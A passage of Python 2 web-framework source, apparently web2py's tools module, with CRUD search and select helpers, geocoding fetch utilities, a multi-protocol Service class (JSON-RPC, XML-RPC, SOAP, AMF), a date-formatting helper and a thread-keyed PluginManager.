session = current.session\n        if next is DEFAULT:\n            next = request.get_vars._next \\\n                or request.post_vars._next \\\n                or self.settings.delete_next\n        if message is DEFAULT:\n            message = self.messages.record_deleted\n        record = table[record_id]\n        if record:\n            callback(self.settings.delete_onvalidation, record)\n            del table[record_id]\n            callback(self.settings.delete_onaccept, record, table._tablename)\n            session.flash = message\n        redirect(next)\n\n    def rows(\n        self,\n        table,\n        query=None,\n        fields=None,\n        orderby=None,\n        limitby=None,\n        ):\n        if not (isinstance(table, Table) or table in self.db.tables):\n            raise HTTP(404)\n        if not self.has_permission('select', table):\n            redirect(self.settings.auth.settings.on_failed_authorization)\n        #if record_id and not self.has_permission('select', table):\n        #    redirect(self.settings.auth.settings.on_failed_authorization)\n        if not isinstance(table, Table):\n            table = self.db[table]\n        if not query:\n            query = table.id > 0\n        if not fields:\n            fields = [field for field in table if field.readable]\n        else:\n            fields = [table[f] if isinstance(f, str) else f for f in fields]\n        rows = self.db(query).select(*fields, **dict(orderby=orderby,\n                                                    limitby=limitby))\n        return rows\n\n    def select(self,\n               table,\n               query=None,\n               fields=None,\n               orderby=None,\n               limitby=None,\n               headers=None,\n               **attr\n               ):\n        headers = headers or {}\n        rows = self.rows(table, query, fields, orderby, limitby)\n        if not rows:\n            return None  # Nicer than an empty table.\n        if not 'upload' in attr:\n            attr['upload'] = self.url('download')\n        if not current.request.extension in ('html', 'load'):\n            return rows.as_list()\n        if not headers:\n            if isinstance(table, str):\n                table = self.db[table]\n            headers = dict((str(k), k.label) for k in table)\n        return SQLTABLE(rows, headers=headers, **attr)\n\n    def get_format(self, field):\n        rtable = field._db[field.type[10:]]\n        format = rtable.get('_format', None)\n        if format and isinstance(format, str):\n            return format[2:-2]\n        return field.name\n\n    def get_query(self, field, op, value, refsearch=False):\n        try:\n            if refsearch:\n                format = self.get_format(field)\n            if op == 'equals':\n                if not refsearch:\n                    return field == value\n                else:\n                    return lambda row: row[field.name][format] == value\n            elif op == 'not equal':\n                if not refsearch:\n                    return field != value\n                else:\n                    return lambda row: row[field.name][format] != value\n            elif op == 'greater than':\n                if not refsearch:\n                    return field > value\n                else:\n                    return lambda row: row[field.name][format] > value\n            elif op == 'less than':\n                if not refsearch:\n                    return field < value\n                else:\n                    return lambda row: row[field.name][format] < value\n            elif op == 'starts with':\n                if not refsearch:\n                    return field.like(value + '%')\n                else:\n                    return lambda row: str(row[field.name][format]).startswith(value)\n            elif op == 'ends with':\n                if not refsearch:\n                    return field.like('%' + value)\n                else:\n                    return lambda row: str(row[field.name][format]).endswith(value)\n            elif op == 'contains':\n                if not refsearch:\n                    return field.like('%' + value + '%')\n                else:\n                    return lambda row: value in row[field.name][format]\n        except:\n            return None\n\n    def search(self, *tables, **args):\n        \"\"\"\n        Creates a search form and its results for a table\n        Examples:\n            Use as::\n\n                form, results = crud.search(db.test,\n                   queries = ['equals', 'not equal', 'contains'],\n                   query_labels={'equals':'Equals',\n                                 'not equal':'Not equal'},\n                   fields = ['id','children'],\n                   field_labels = {\n                       'id':'ID','children':'Children'},\n                   zero='Please choose',\n                   query = (db.test.id > 0)&(db.test.id != 3) )\n\n        \"\"\"\n        table = tables[0]\n        fields = args.get('fields', table.fields)\n        validate = args.get('validate', True)\n        request = current.request\n        db = self.db\n        if not (isinstance(table, Table) or table in db.tables):\n            raise HTTP(404)\n        attributes = {}\n        for key in ('orderby', 'groupby', 'left', 'distinct', 'limitby', 'cache'):\n            if key in args:\n                attributes[key] = args[key]\n        tbl = TABLE()\n        selected = []\n        refsearch = []\n        results = []\n        showall = args.get('showall', False)\n        if showall:\n            selected = fields\n        chkall = args.get('chkall', False)\n        if chkall:\n            for f in fields:\n                request.vars['chk%s' % f] = 'on'\n        ops = args.get('queries', [])\n        zero = args.get('zero', '')\n        if not ops:\n            ops = ['equals', 'not equal', 'greater than',\n                   'less than', 'starts with',\n                   'ends with', 'contains']\n        ops.insert(0, zero)\n        query_labels = args.get('query_labels', {})\n        query = args.get('query', table.id > 0)\n        field_labels = args.get('field_labels', {})\n        for field in fields:\n            field = table[field]\n            if not field.readable:\n                continue\n            fieldname = field.name\n            chkval = request.vars.get('chk' + fieldname, None)\n            txtval = request.vars.get('txt' + fieldname, None)\n            opval = request.vars.get('op' + fieldname, None)\n            row = TR(TD(INPUT(_type=\"checkbox\", _name=\"chk\" + fieldname,\n                              _disabled=(field.type == 'id'),\n                              value=(field.type == 'id' or chkval == 'on'))),\n                     TD(field_labels.get(fieldname, field.label)),\n                     TD(SELECT([OPTION(query_labels.get(op, op),\n                                       _value=op) for op in ops],\n                               _name=\"op\" + fieldname,\n                               value=opval)),\n                     TD(INPUT(_type=\"text\", _name=\"txt\" + fieldname,\n                              _value=txtval, _id='txt' + fieldname,\n                              _class=str(field.type))))\n            tbl.append(row)\n            if request.post_vars and (chkval or field.type == 'id'):\n                if txtval and opval != '':\n                    if field.type[0:10] == 'reference ':\n                        refsearch.append(self.get_query(field, opval, txtval, refsearch=True))\n                    elif validate:\n                        value, error = field.validate(txtval)\n                        if not error:\n                            ### TODO deal with 'starts with', 'ends with', 'contains' on GAE\n                            query &= self.get_query(field, opval, value)\n                        else:\n                            row[3].append(DIV(error, _class='error'))\n                    else:\n                        query &= self.get_query(field, opval, txtval)\n                selected.append(field)\n        form = FORM(tbl, INPUT(_type=\"submit\"))\n        if selected:\n            try:\n                results = db(query).select(*selected, **attributes)\n                for r in refsearch:\n                    results = results.find(r)\n            except:  # hmmm, we should do better here\n                results = None\n        return form, results\n\n\nurllib2.install_opener(urllib2.build_opener(urllib2.HTTPCookieProcessor()))\n\n\ndef fetch(url, data=None, headers=None,\n          cookie=Cookie.SimpleCookie(),\n          user_agent='Mozilla/5.0'):\n    headers = headers or {}\n    if not data is None:\n        data = urllib.urlencode(data)\n    if user_agent:\n        headers['User-agent'] = user_agent\n    headers['Cookie'] = ' '.join(\n        ['%s=%s;' % (c.key, c.value) for c in cookie.values()])\n    try:\n        from google.appengine.api import urlfetch\n    except ImportError:\n        req = urllib2.Request(url, data, headers)\n        html = urllib2.urlopen(req).read()\n    else:\n        method = ((data is None) and urlfetch.GET) or urlfetch.POST\n        while url is not None:\n            response = urlfetch.fetch(url=url, payload=data,\n                                      method=method, headers=headers,\n                                      allow_truncated=False, follow_redirects=False,\n                                      deadline=10)\n            # next request will be a get, so no need to send the data again\n            data = None\n            method = urlfetch.GET\n            # load cookies from the response\n            cookie.load(response.headers.get('set-cookie', ''))\n            url = response.headers.get('location')\n        html = response.content\n    return html\n\nregex_geocode = \\\n    re.compile(r\"\"\"<geometry>[\\W]*?<location>[\\W]*?<lat>(?P<la>[^<]*)</lat>[\\W]*?<lng>(?P<lo>[^<]*)</lng>[\\W]*?</location>\"\"\")\n\n\ndef geocode(address):\n    try:\n        a = urllib.quote(address)\n        txt = fetch('http://maps.googleapis.com/maps/api/geocode/xml?sensor=false&address=%s'\n                     % a)\n        item = regex_geocode.search(txt)\n        (la, lo) = (float(item.group('la')), float(item.group('lo')))\n        return (la, lo)\n    except:\n        return (0.0, 0.0)\n\n\ndef reverse_geocode(lat, lng, lang=None):\n    \"\"\" Try to get an approximate address for a given latitude, longitude. \"\"\"\n    if not lang:\n        lang = current.T.accepted_language\n    try:\n        return json_parser.loads(fetch('http://maps.googleapis.com/maps/api/geocode/json?latlng=%(lat)s,%(lng)s&language=%(lang)s' % locals()))['results'][0]['formatted_address']\n    except:\n        return ''\n\n\ndef universal_caller(f, *a, **b):\n    c = f.func_code.co_argcount\n    n = f.func_code.co_varnames[:c]\n\n    defaults = f.func_defaults or []\n    pos_args = n[0:-len(defaults)]\n    named_args = n[-len(defaults):]\n\n    arg_dict = {}\n\n    # Fill the arg_dict with name and value for the submitted, positional values\n    for pos_index, pos_val in enumerate(a[:c]):\n        arg_dict[n[pos_index]] = pos_val    # n[pos_index] is the name of the argument\n\n    # There might be pos_args left, that are sent as named_values. Gather them as well.\n    # If a argument already is populated with values we simply replaces them.\n    for arg_name in pos_args[len(arg_dict):]:\n        if arg_name in b:\n            arg_dict[arg_name] = b[arg_name]\n\n    if len(arg_dict) >= len(pos_args):\n        # All the positional arguments is found. The function may now be called.\n        # However, we need to update the arg_dict with the values from the named arguments as well.\n        for arg_name in named_args:\n            if arg_name in b:\n                arg_dict[arg_name] = b[arg_name]\n\n        return f(**arg_dict)\n\n    # Raise an error, the function cannot be called.\n    raise HTTP(404, \"Object does not exist\")\n\n\nclass Service(object):\n\n    def __init__(self, environment=None):\n        self.run_procedures = {}\n        self.csv_procedures = {}\n        self.xml_procedures = {}\n        self.rss_procedures = {}\n        self.json_procedures = {}\n        self.jsonrpc_procedures = {}\n        self.jsonrpc2_procedures = {}\n        self.xmlrpc_procedures = {}\n        self.amfrpc_procedures = {}\n        self.amfrpc3_procedures = {}\n        self.soap_procedures = {}\n\n    def run(self, f):\n        \"\"\"\n        Example:\n            Use as::\n\n                service = Service()\n                @service.run\n                def myfunction(a, b):\n                    return a + b\n                def call():\n                    return service()\n\n            Then call it with::\n\n                wget http://..../app/default/call/run/myfunction?a=3&b=4\n\n        \"\"\"\n        self.run_procedures[f.__name__] = f\n        return f\n\n    def csv(self, f):\n        \"\"\"\n        Example:\n            Use as::\n\n                service = Service()\n                @service.csv\n                def myfunction(a, b):\n                    return a + b\n                def call():\n                    return service()\n\n            Then call it with::\n\n                wget http://..../app/default/call/csv/myfunction?a=3&b=4\n\n        \"\"\"\n        self.run_procedures[f.__name__] = f\n        return f\n\n    def xml(self, f):\n        \"\"\"\n        Example:\n            Use as::\n\n                service = Service()\n                @service.xml\n                def myfunction(a, b):\n                    return a + b\n                def call():\n                    return service()\n\n            Then call it with::\n\n                wget http://..../app/default/call/xml/myfunction?a=3&b=4\n\n        \"\"\"\n        self.run_procedures[f.__name__] = f\n        return f\n\n    def rss(self, f):\n        \"\"\"\n        Example:\n            Use as::\n\n                service = Service()\n                @service.rss\n                def myfunction():\n                    return dict(title=..., link=..., description=...,\n                        created_on=..., entries=[dict(title=..., link=...,\n                            description=..., created_on=...])\n                def call():\n                    return service()\n\n            Then call it with:\n\n                wget http://..../app/default/call/rss/myfunction\n\n        \"\"\"\n        self.rss_procedures[f.__name__] = f\n        return f\n\n    def json(self, f):\n        \"\"\"\n        Example:\n            Use as::\n\n                service = Service()\n                @service.json\n                def myfunction(a, b):\n                    return [{a: b}]\n                def call():\n                    return service()\n\n            Then call it with:;\n\n                wget http://..../app/default/call/json/myfunction?a=hello&b=world\n\n        \"\"\"\n        self.json_procedures[f.__name__] = f\n        return f\n\n    def jsonrpc(self, f):\n        \"\"\"\n        Example:\n            Use as::\n\n                service = Service()\n                @service.jsonrpc\n                def myfunction(a, b):\n                    return a + b\n                def call():\n                    return service()\n\n            Then call it with:\n\n                wget http://..../app/default/call/jsonrpc/myfunction?a=hello&b=world\n\n        \"\"\"\n        self.jsonrpc_procedures[f.__name__] = f\n        return f\n\n    def jsonrpc2(self, f):\n        \"\"\"\n        Example:\n            Use as::\n\n                service = Service()\n                @service.jsonrpc2\n                def myfunction(a, b):\n                    return a + b\n                def call():\n                    return service()\n\n            Then call it with:\n\n                wget --post-data '{\"jsonrpc\": \"2.0\", \"id\": 1, \"method\": \"myfunction\", \"params\": {\"a\": 1, \"b\": 2}}' http://..../app/default/call/jsonrpc2\n\n        \"\"\"\n        self.jsonrpc2_procedures[f.__name__] = f\n        return f\n\n    def xmlrpc(self, f):\n        \"\"\"\n        Example:\n            Use as::\n\n                service = Service()\n                @service.xmlrpc\n                def myfunction(a, b):\n                    return a + b\n                def call():\n                    return service()\n\n            The call it with:\n\n                wget http://..../app/default/call/xmlrpc/myfunction?a=hello&b=world\n\n        \"\"\"\n        self.xmlrpc_procedures[f.__name__] = f\n        return f\n\n    def amfrpc(self, f):\n        \"\"\"\n        Example:\n            Use as::\n\n                service = Service()\n                @service.amfrpc\n                def myfunction(a, b):\n                    return a + b\n                def call():\n                    return service()\n\n\n            Then call it with::\n\n                wget http://..../app/default/call/amfrpc/myfunction?a=hello&b=world\n\n        \"\"\"\n        self.amfrpc_procedures[f.__name__] = f\n        return f\n\n    def amfrpc3(self, domain='default'):\n        \"\"\"\n        Example:\n            Use as::\n\n                service = Service()\n                @service.amfrpc3('domain')\n                def myfunction(a, b):\n                    return a + b\n                def call():\n                    return service()\n\n            Then call it with:\n\n                wget http://..../app/default/call/amfrpc3/myfunction?a=hello&b=world\n\n        \"\"\"\n        if not isinstance(domain, str):\n            raise SyntaxError(\"AMF3 requires a domain for function\")\n\n        def _amfrpc3(f):\n            if domain:\n                self.amfrpc3_procedures[domain + '.' + f.__name__] = f\n            else:\n                self.amfrpc3_procedures[f.__name__] = f\n            return f\n        return _amfrpc3\n\n    def soap(self, name=None, returns=None, args=None, doc=None):\n        \"\"\"\n        Example:\n            Use as::\n\n                service = Service()\n                @service.soap('MyFunction',returns={'result':int},args={'a':int,'b':int,})\n                def myfunction(a, b):\n                    return a + b\n                def call():\n                    return service()\n\n        Then call it with::\n\n            from gluon.contrib.pysimplesoap.client import SoapClient\n            client = SoapClient(wsdl=\"http://..../app/default/call/soap?WSDL\")\n            response = client.MyFunction(a=1,b=2)\n            return response['result']\n\n        It also exposes online generated documentation and xml example messages\n        at `http://..../app/default/call/soap`\n        \"\"\"\n\n        def _soap(f):\n            self.soap_procedures[name or f.__name__] = f, returns, args, doc\n            return f\n        return _soap\n\n    def serve_run(self, args=None):\n        request = current.request\n        if not args:\n            args = request.args\n        if args and args[0] in self.run_procedures:\n            return str(universal_caller(self.run_procedures[args[0]],\n                                        *args[1:], **dict(request.vars)))\n        self.error()\n\n    def serve_csv(self, args=None):\n        request = current.request\n        response = current.response\n        response.headers['Content-Type'] = 'text/x-csv'\n        if not args:\n            args = request.args\n\n        def none_exception(value):\n            if isinstance(value, unicode):\n                return value.encode('utf8')\n            if hasattr(value, 'isoformat'):\n                return value.isoformat()[:19].replace('T', ' ')\n            if value is None:\n                return '<NULL>'\n            return value\n        if args and args[0] in self.run_procedures:\n            import types\n            r = universal_caller(self.run_procedures[args[0]],\n                                 *args[1:], **dict(request.vars))\n            s = cStringIO.StringIO()\n            if hasattr(r, 'export_to_csv_file'):\n                r.export_to_csv_file(s)\n            elif r and not isinstance(r, types.GeneratorType) and isinstance(r[0], (dict, Storage)):\n                import csv\n                writer = csv.writer(s)\n                writer.writerow(r[0].keys())\n                for line in r:\n                    writer.writerow([none_exception(v)\n                                     for v in line.values()])\n            else:\n                import csv\n                writer = csv.writer(s)\n                for line in r:\n                    writer.writerow(line)\n            return s.getvalue()\n        self.error()\n\n    def serve_xml(self, args=None):\n        request = current.request\n        response = current.response\n        response.headers['Content-Type'] = 'text/xml'\n        if not args:\n            args = request.args\n        if args and args[0] in self.run_procedures:\n            s = universal_caller(self.run_procedures[args[0]],\n                                 *args[1:], **dict(request.vars))\n            if hasattr(s, 'as_list'):\n                s = s.as_list()\n            return serializers.xml(s, quote=False)\n        self.error()\n\n    def serve_rss(self, args=None):\n        request = current.request\n        response = current.response\n        if not args:\n            args = request.args\n        if args and args[0] in self.rss_procedures:\n            feed = universal_caller(self.rss_procedures[args[0]],\n                                    *args[1:], **dict(request.vars))\n        else:\n            self.error()\n        response.headers['Content-Type'] = 'application/rss+xml'\n        return serializers.rss(feed)\n\n    def serve_json(self, args=None):\n        request = current.request\n        response = current.response\n        response.headers['Content-Type'] = 'application/json; charset=utf-8'\n        if not args:\n            args = request.args\n        d = dict(request.vars)\n        if args and args[0] in self.json_procedures:\n            s = universal_caller(self.json_procedures[args[0]], *args[1:], **d)\n            if hasattr(s, 'as_list'):\n                s = s.as_list()\n            return response.json(s)\n        self.error()\n\n    class JsonRpcException(Exception):\n        def __init__(self, code, info):\n            jrpc_error = Service.jsonrpc_errors.get(code)\n            if jrpc_error:\n                self.message, self.description = jrpc_error\n            self.code, self.info = code, info\n\n    # jsonrpc 2.0 error types.  records the following structure {code: (message,meaning)}\n    jsonrpc_errors = {\n        -32700: (\"Parse error. Invalid JSON was received by the server.\",  \"An error occurred on the server while parsing the JSON text.\"),\n        -32600: (\"Invalid Request\", \"The JSON sent is not a valid Request object.\"),\n        -32601: (\"Method not found\", \"The method does not exist / is not available.\"),\n        -32602: (\"Invalid params\", \"Invalid method parameter(s).\"),\n        -32603: (\"Internal error\", \"Internal JSON-RPC error.\"),\n        -32099: (\"Server error\", \"Reserved for implementation-defined server-errors.\")}\n\n    def serve_jsonrpc(self):\n        def return_response(id, result):\n            return serializers.json({'version': '1.1',\n                'id': id, 'result': result, 'error': None})\n\n        def return_error(id, code, message, data=None):\n            error = {'name': 'JSONRPCError',\n                     'code': code, 'message': message}\n            if data is not None:\n                error['data'] = data\n            return serializers.json({'id': id,\n                                     'version': '1.1',\n                                     'error': error,\n                                     })\n\n        request = current.request\n        response = current.response\n        response.headers['Content-Type'] = 'application/json; charset=utf-8'\n        methods = self.jsonrpc_procedures\n        data = json_parser.loads(request.body.read())\n        jsonrpc_2 = data.get('jsonrpc')\n        if jsonrpc_2: #hand over to version 2 of the protocol\n            return self.serve_jsonrpc2(data)\n        id, method, params = data.get('id'), data.get('method'), data.get('params', [])\n        if id is None:\n            return return_error(0, 100, 'missing id')\n        if not method in methods:\n            return return_error(id, 100, 'method \"%s\" does not exist' % method)\n        try:\n            if isinstance(params, dict):\n                s = methods[method](**params)\n            else:\n                s = methods[method](*params)\n            if hasattr(s, 'as_list'):\n                s = s.as_list()\n            return return_response(id, s)\n        except Service.JsonRpcException, e:\n            return return_error(id, e.code, e.info)\n        except:\n            etype, eval, etb = sys.exc_info()\n            message = '%s: %s' % (etype.__name__, eval)\n            data = request.is_local and traceback.format_tb(etb)\n            logger.warning('jsonrpc exception %s\\n%s' % (message, traceback.format_tb(etb)))\n            return return_error(id, 100, message, data)\n\n    def serve_jsonrpc2(self, data=None, batch_element=False):\n\n        def return_response(id, result):\n            if not must_respond:\n                return None\n            return serializers.json({'jsonrpc': '2.0',\n                'id': id, 'result': result})\n\n        def return_error(id, code, message=None, data=None):\n            error = {'code': code}\n            if Service.jsonrpc_errors.has_key(code):\n                error['message'] = Service.jsonrpc_errors[code][0]\n                error['data'] = Service.jsonrpc_errors[code][1]\n            if message is not None:\n                error['message'] = message\n            if data is not None:\n                error['data'] = data\n            return serializers.json({'jsonrpc': '2.0',\n                                     'id': id,\n                                     'error': error})\n\n        def validate(data):\n            \"\"\"\n            Validate request as defined in: http://www.jsonrpc.org/specification#request_object.\n\n            Args:\n                data(str): The json object.\n\n            Returns:\n                - True -- if successful\n                - False -- if no error should be reported (i.e. data is missing 'id' member)\n\n            Raises:\n                JsonRPCException\n\n            \"\"\"\n\n            iparms = set(data.keys())\n            mandatory_args = set(['jsonrpc', 'method'])\n            missing_args = mandatory_args - iparms\n\n            if missing_args:\n                raise Service.JsonRpcException(-32600, 'Missing arguments %s.' % list(missing_args))\n            if data['jsonrpc'] != '2.0':\n                raise Service.JsonRpcException(-32603, 'Unsupported jsonrpc version \"%s\"' % data['jsonrpc'])\n            if 'id' not in iparms:\n                 return False\n\n            return True\n\n        request = current.request\n        response = current.response\n        if not data:\n            response.headers['Content-Type'] = 'application/json; charset=utf-8'\n            try:\n                data = json_parser.loads(request.body.read())\n            except ValueError:  # decoding error in json lib\n                return return_error(None, -32700)\n\n        # Batch handling\n        if isinstance(data, list) and not batch_element:\n            retlist = []\n            for c in data:\n                retstr = self.serve_jsonrpc2(c, batch_element=True)\n                if retstr:  # do not add empty responses\n                    retlist.append(retstr)\n            if len(retlist) == 0:  # return nothing\n                return ''\n            else:\n                return \"[\" + ','.join(retlist) + \"]\"\n        methods = self.jsonrpc2_procedures\n        methods.update(self.jsonrpc_procedures)\n\n        try:\n            must_respond = validate(data)\n        except Service.JsonRpcException, e:\n            return return_error(None, e.code, e.info)\n\n        id, method, params = data.get('id'), data['method'], data.get('params', '')\n        if not method in methods:\n            return return_error(id, -32601, data='Method \"%s\" does not exist' % method)\n        try:\n            if isinstance(params, dict):\n                s = methods[method](**params)\n            else:\n                s = methods[method](*params)\n            if hasattr(s, 'as_list'):\n                s = s.as_list()\n            if must_respond:\n                return return_response(id, s)\n            else:\n                return ''\n        except HTTP, e:\n            raise e\n        except Service.JsonRpcException, e:\n            return return_error(id, e.code, e.info)\n        except:\n            etype, eval, etb = sys.exc_info()\n            data = '%s: %s\\n' % (etype.__name__, eval) + str(request.is_local and traceback.format_tb(etb))\n            logger.warning('%s: %s\\n%s' % (etype.__name__, eval, traceback.format_tb(etb)))\n            return return_error(id, -32099, data=data)\n\n    def serve_xmlrpc(self):\n        request = current.request\n        response = current.response\n        services = self.xmlrpc_procedures.values()\n        return response.xmlrpc(request, services)\n\n    def serve_amfrpc(self, version=0):\n        try:\n            import pyamf\n            import pyamf.remoting.gateway\n        except:\n            return \"pyamf not installed or not in Python sys.path\"\n        request = current.request\n        response = current.response\n        if version == 3:\n            services = self.amfrpc3_procedures\n            base_gateway = pyamf.remoting.gateway.BaseGateway(services)\n            pyamf_request = pyamf.remoting.decode(request.body)\n        else:\n            services = self.amfrpc_procedures\n            base_gateway = pyamf.remoting.gateway.BaseGateway(services)\n            context = pyamf.get_context(pyamf.AMF0)\n            pyamf_request = pyamf.remoting.decode(request.body, context)\n        pyamf_response = pyamf.remoting.Envelope(pyamf_request.amfVersion)\n        for name, message in pyamf_request:\n            pyamf_response[name] = base_gateway.getProcessor(message)(message)\n        response.headers['Content-Type'] = pyamf.remoting.CONTENT_TYPE\n        if version == 3:\n            return pyamf.remoting.encode(pyamf_response).getvalue()\n        else:\n            return pyamf.remoting.encode(pyamf_response, context).getvalue()\n\n    def serve_soap(self, version=\"1.1\"):\n        try:\n            from gluon.contrib.pysimplesoap.server import SoapDispatcher\n        except:\n            return \"pysimplesoap not installed in contrib\"\n        request = current.request\n        response = current.response\n        procedures = self.soap_procedures\n\n        location = \"%s://%s%s\" % (\n                        request.env.wsgi_url_scheme,\n                        request.env.http_host,\n                        URL(r=request, f=\"call/soap\", vars={}))\n        namespace = 'namespace' in response and response.namespace or location\n        documentation = response.description or ''\n        dispatcher = SoapDispatcher(\n            name=response.title,\n            location=location,\n            action=location,  # SOAPAction\n            namespace=namespace,\n            prefix='pys',\n            documentation=documentation,\n            ns=True)\n        for method, (function, returns, args, doc) in procedures.iteritems():\n            dispatcher.register_function(method, function, returns, args, doc)\n        if request.env.request_method == 'POST':\n            fault = {}\n            # Process normal Soap Operation\n            response.headers['Content-Type'] = 'text/xml'\n            xml = dispatcher.dispatch(request.body.read(), fault=fault)\n            if fault:\n                # May want to consider populating a ticket here...\n                response.status = 500\n            # return the soap response\n            return xml\n        elif 'WSDL' in request.vars:\n            # Return Web Service Description\n            response.headers['Content-Type'] = 'text/xml'\n            return dispatcher.wsdl()\n        elif 'op' in request.vars:\n            # Return method help webpage\n            response.headers['Content-Type'] = 'text/html'\n            method = request.vars['op']\n            sample_req_xml, sample_res_xml, doc = dispatcher.help(method)\n            body = [H1(\"Welcome to Web2Py SOAP webservice gateway\"),\n                    A(\"See all webservice operations\",\n                      _href=URL(r=request, f=\"call/soap\", vars={})),\n                    H2(method),\n                    P(doc),\n                    UL(LI(\"Location: %s\" % dispatcher.location),\n                       LI(\"Namespace: %s\" % dispatcher.namespace),\n                       LI(\"SoapAction: %s\" % dispatcher.action),\n                    ),\n                    H3(\"Sample SOAP XML Request Message:\"),\n                    CODE(sample_req_xml, language=\"xml\"),\n                    H3(\"Sample SOAP XML Response Message:\"),\n                    CODE(sample_res_xml, language=\"xml\"),\n                    ]\n            return {'body': body}\n        else:\n            # Return general help and method list webpage\n            response.headers['Content-Type'] = 'text/html'\n            body = [H1(\"Welcome to Web2Py SOAP webservice gateway\"),\n                    P(response.description),\n                    P(\"The following operations are available\"),\n                    A(\"See WSDL for webservice description\",\n                      _href=URL(r=request, f=\"call/soap\", vars={\"WSDL\":None})),\n                    UL([LI(A(\"%s: %s\" % (method, doc or ''),\n                             _href=URL(r=request, f=\"call/soap\", vars={'op': method})))\n                        for method, doc in dispatcher.list_methods()]),\n                    ]\n            return {'body': body}\n\n    def __call__(self):\n        \"\"\"\n        Registers services with::\n\n            service = Service()\n            @service.run\n            @service.rss\n            @service.json\n            @service.jsonrpc\n            @service.xmlrpc\n            @service.amfrpc\n            @service.amfrpc3('domain')\n            @service.soap('Method', returns={'Result':int}, args={'a':int,'b':int,})\n\n        Exposes services with::\n\n            def call():\n                return service()\n\n        You can call services with::\n\n            http://..../app/default/call/run?[parameters]\n            http://..../app/default/call/rss?[parameters]\n            http://..../app/default/call/json?[parameters]\n            http://..../app/default/call/jsonrpc\n            http://..../app/default/call/xmlrpc\n            http://..../app/default/call/amfrpc\n            http://..../app/default/call/amfrpc3\n            http://..../app/default/call/soap\n\n        \"\"\"\n\n        request = current.request\n        if len(request.args) < 1:\n            raise HTTP(404, \"Not Found\")\n        arg0 = request.args(0)\n        if arg0 == 'run':\n            return self.serve_run(request.args[1:])\n        elif arg0 == 'rss':\n            return self.serve_rss(request.args[1:])\n        elif arg0 == 'csv':\n            return self.serve_csv(request.args[1:])\n        elif arg0 == 'xml':\n            return self.serve_xml(request.args[1:])\n        elif arg0 == 'json':\n            return self.serve_json(request.args[1:])\n        elif arg0 == 'jsonrpc':\n            return self.serve_jsonrpc()\n        elif arg0 == 'jsonrpc2':\n            return self.serve_jsonrpc2()\n        elif arg0 == 'xmlrpc':\n            return self.serve_xmlrpc()\n        elif arg0 == 'amfrpc':\n            return self.serve_amfrpc()\n        elif arg0 == 'amfrpc3':\n            return self.serve_amfrpc(3)\n        elif arg0 == 'soap':\n            return self.serve_soap()\n        else:\n            self.error()\n\n    def error(self):\n        raise HTTP(404, \"Object does not exist\")\n\n\ndef completion(callback):\n    \"\"\"\n    Executes a task on completion of the called action.\n\n    Example:\n        Use as::\n\n            from gluon.tools import completion\n            @completion(lambda d: logging.info(repr(d)))\n            def index():\n                return dict(message='hello')\n\n    It logs the output of the function every time input is called.\n    The argument of completion is executed in a new thread.\n    \"\"\"\n    def _completion(f):\n        def __completion(*a, **b):\n            d = None\n            try:\n                d = f(*a, **b)\n                return d\n            finally:\n                thread.start_new_thread(callback, (d,))\n        return __completion\n    return _completion\n\n\ndef prettydate(d, T=lambda x: x):\n    if isinstance(d, datetime.datetime):\n        dt = datetime.datetime.now() - d\n    elif isinstance(d, datetime.date):\n        dt = datetime.date.today() - d\n    elif not d:\n        return ''\n    else:\n        return '[invalid date]'\n    if dt.days < 0:\n        suffix = ' from now'\n        dt = -dt\n    else:\n        suffix = ' ago'\n    if dt.days >= 2 * 365:\n        return T('%d years' + suffix) % int(dt.days / 365)\n    elif dt.days >= 365:\n        return T('1 year' + suffix)\n    elif dt.days >= 60:\n        return T('%d months' + suffix) % int(dt.days / 30)\n    elif dt.days > 21:\n        return T('1 month' + suffix)\n    elif dt.days >= 14:\n        return T('%d weeks' + suffix) % int(dt.days / 7)\n    elif dt.days >= 7:\n        return T('1 week' + suffix)\n    elif dt.days > 1:\n        return T('%d days' + suffix) % dt.days\n    elif dt.days == 1:\n        return T('1 day' + suffix)\n    elif dt.seconds >= 2 * 60 * 60:\n        return T('%d hours' + suffix) % int(dt.seconds / 3600)\n    elif dt.seconds >= 60 * 60:\n        return T('1 hour' + suffix)\n    elif dt.seconds >= 2 * 60:\n        return T('%d minutes' + suffix) % int(dt.seconds / 60)\n    elif dt.seconds >= 60:\n        return T('1 minute' + suffix)\n    elif dt.seconds > 1:\n        return T('%d seconds' + suffix) % dt.seconds\n    elif dt.seconds == 1:\n        return T('1 second' + suffix)\n    else:\n        return T('now')\n\n\ndef test_thread_separation():\n    def f():\n        c = PluginManager()\n        lock1.acquire()\n        lock2.acquire()\n        c.x = 7\n        lock1.release()\n        lock2.release()\n    lock1 = thread.allocate_lock()\n    lock2 = thread.allocate_lock()\n    lock1.acquire()\n    thread.start_new_thread(f, ())\n    a = PluginManager()\n    a.x = 5\n    lock1.release()\n    lock2.acquire()\n    return a.x\n\n\nclass PluginManager(object):\n    \"\"\"\n\n    Plugin Manager is similar to a storage object but it is a single level\n    singleton. This means that multiple instances within the same thread share\n    the same attributes.\n    Its constructor is also special. The first argument is the name of the\n    plugin you are defining.\n    The named arguments are parameters needed by the plugin with default values.\n    If the parameters were previous defined, the old values are used.\n\n    Example:\n        in some general configuration file::\n\n            plugins = PluginManager()\n            plugins.me.param1=3\n\n        within the plugin model::\n\n            _ = PluginManager('me',param1=5,param2=6,param3=7)\n\n        where the plugin is used::\n\n            >>> print plugins.me.param1\n            3\n            >>> print plugins.me.param2\n            6\n            >>> plugins.me.param3 = 8\n            >>> print plugins.me.param3\n            8\n\n        Here are some tests::\n\n            >>> a=PluginManager()\n            >>> a.x=6\n            >>> b=PluginManager('check')\n            >>> print b.x\n            6\n            >>> b=PluginManager() # reset settings\n            >>> print b.x\n            <Storage {}>\n            >>> b.x=7\n            >>> print a.x\n            7\n            >>> a.y.z=8\n            >>> print b.y.z\n            8\n            >>> test_thread_separation()\n            5\n            >>> plugins=PluginManager('me',db='mydb')\n            >>> print plugins.me.db\n            mydb\n            >>> print 'me' in plugins\n            True\n            >>> print plugins.me.installed\n            True\n\n    \"\"\"\n    instances = {}\n\n    def __new__(cls, *a, **b):\n        id = thread.get_ident()\n        lock = thread.allocate_lock()\n        try:\n            lock.acquire()\n            try:\n                return cls.instances[id]\n            except KeyError:\n                instance = object.__new__(cls, *a, **b)\n                cls.instances[id] = instance\n                return instance\n        finally:\n            lock.release()\n\n    def __init__(self, plugin=None, **defaults):\n        if not plugin:\n            self.__dict__.clear()\n        settings = self.__getattr__(plugin)\n        settings.installed = True\n        settings.update(\n            (k, v) for k, v in defaults.items() if not k in settings)\n\n    def __getattr__(self, key):\n        if not key in self.__dict__:\n            self.__dict__[key] = 